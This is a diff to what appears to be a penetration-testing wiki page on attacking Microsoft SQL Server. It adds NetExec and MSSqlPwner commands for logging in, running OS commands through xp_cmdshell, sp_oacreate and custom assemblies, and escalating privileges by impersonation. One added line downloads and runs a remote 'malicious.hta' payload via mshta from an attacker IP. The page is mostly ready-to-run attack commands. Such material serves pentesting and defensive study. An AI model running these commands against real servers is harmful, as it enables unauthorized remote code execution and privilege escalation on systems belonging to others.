@@ -110,18 +110,52 @@ sqsh -S <target-ip> -U username -P password
 sqsh -S <target-ip> -U username -P password -D database
 ```
 {% endtab %}
+
+{% tab title="NetExec" %}
+Tools like [NetExec](https://github.com/Pennyw0rth/NetExec) can be used to login to an MSSQL instance, and to perform SQL queries.
+
+```bash
+# Domain Auth
+netexec mssql <TARGET> -u <USER> -p <PASSWORD> -q 'SELECT name FROM master.dbo.sysdatabases;'
+
+# Use Windows Authentication (forces NTLM authentication)
+netexec mssql <TARGET> -u <USER> -p <PASSWORD> --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
+```
+{% endtab %}
 {% endtabs %}
 
 ### Remote Code Execution
 
 {% tabs %}
+{% tab title="MSSqlPwner" %}
+[MSSqlPwner](https://github.com/ScorpionesLabs/MSSqlPwner) can be used to execute remote commands through various methods.
+
+```bash
+# Interactive mode
+mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth interactive
+
+# Interactive mode with 2 depth level of impersonations
+mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth -max-impersonation-depth 2 interactive
+
+# Executing custom assembly on the current server with windows authentication and executing whoami command 
+mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth custom-asm whoami
+
+# Executing the whoami command using stored procedures with sp_oacreate method
+mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
+
+# Execute code using custom assembly
+mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth inject-custom-asm SqlInject.dll 
+```
+{% endtab %}
+
 {% tab title="mssclient" %}
 Using [mssqlclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) from [Impacket](https://github.com/fortra/impacket), we may be able to execute code.
 
 ```sql
+$ mssqlclient.py -port 1433 DOMAIN/username:password@<target-ip>
+
 # Enable xp_cmdshell
 SQL (dbo@master)> enable_xp_cmdshell
-
 # Execute command
 SQL (dbo@master)> xp_cmdshell whoami
 ```
@@ -131,12 +165,15 @@ SQL (dbo@master)> xp_cmdshell whoami
 Tools like [NetExec](https://github.com/Pennyw0rth/NetExec) can be used to execute OS commands from MSSQL
 
 ```bash
+# Execute commands using xp_cmdshell
 netexec mssql <TARGET> -d <DOMAIN> -u <USER> -p <PASSWORD> -x "whoami"
 ```
 {% endtab %}
 {% endtabs %}
 
-To directly execute or read/write files on a MSSQL instance, check the following page:
+### Local Code Execution
+
+To localy execute/read/write files on an MSSQL instance, see the following page:
 
 {% content-ref url="../../web/infrastructures/dbms/exploit-databases.md" %}
 [exploit-databases.md](../../web/infrastructures/dbms/exploit-databases.md)
@@ -155,6 +192,8 @@ On MS-SQL (Microsoft SQL) servers, the EXEC method can be used to access a remot
 {% tabs %}
 {% tab title="db_owner to sysadmin" %}
 If a **regular user** is given the role **`db_owner`** over the **database owned by an admin** user (such as **`sa`**) and that database is configured as **`trustworthy`**, that user can abuse these privileges to **privesc** because **stored procedures** created in there that can **execute** as the owner (**admin**).
+
+### Windows
 
 To enumerate, run the following queries
 
@@ -205,6 +244,23 @@ Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlSer
 
 {% tab title="Impersonate" %}
 SQL Server has a special permission, named **`IMPERSONATE`**, that **allows the executing user to take on the permissions of another user** or login until the context is reset or the session ends.
+
+### UNIX-Like
+
+From an UNIX-Like host, using [NetExec](https://github.com/Pennyw0rth/NetExec), we can enumerate for impersonation privileges and PrivEsc as follows
+
+```bash
+# Enumerate PrivEsc vectors
+nxc mssql <TARGET> <TARGET> -u <USER> -p <PASSWORD> -M mssql_priv
+
+# Impersonate PrivEsc
+nxc mssql <TARGET> <TARGET> -u <USER> -p <PASSWORD> -M mssql_priv -o ACTION=privesc
+
+# Rollback sysadmin privs
+nxc mssql <TARGET> <TARGET> -u <USER> -p <PASSWORD> -M mssql_priv -o ACTION=rollback
+```
+
+### Windows
 
 To enumerate users that you can impersonate, run the following queries
 
